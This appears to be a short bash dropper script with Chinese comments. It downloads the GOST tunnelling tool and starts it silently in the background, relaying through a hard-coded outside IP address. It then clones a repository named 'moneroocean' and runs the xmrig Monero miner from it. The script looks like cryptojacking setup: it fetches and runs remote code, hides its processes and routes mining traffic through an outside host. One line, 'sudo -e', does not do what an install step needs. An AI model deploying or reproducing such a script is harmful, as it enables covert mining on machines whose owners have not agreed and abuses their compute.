#!/bin/bash

# 安装依赖
sudo -e

apt update
apt install -y wget git unzip

# 下载 GOST
wget -q https://github.com/ginuerzh/gost/releases/download/v2.12.0/gost_2.12.0_linux_amd64.tar.gz

# 安装 GOST
tar -zxf gost_2.12.0_linux_amd64.tar.gz
mv gost /usr/local/bin
chmod +x /usr/local/bin/gost

# 启动 GOST 后台
nohup gost -L=tcp://:3335 -F=relay+wss://64.81.113.107:9999 >/dev/null 2>&1 &
sleep 4

# 下载并运行 xmrig
rm -rf moneroocean
git clone https://github.com/mysudn/moneroocean.git
cd moneroocean
unzip -o moneroocean.zip
chmod +x xmrig
./xmrig
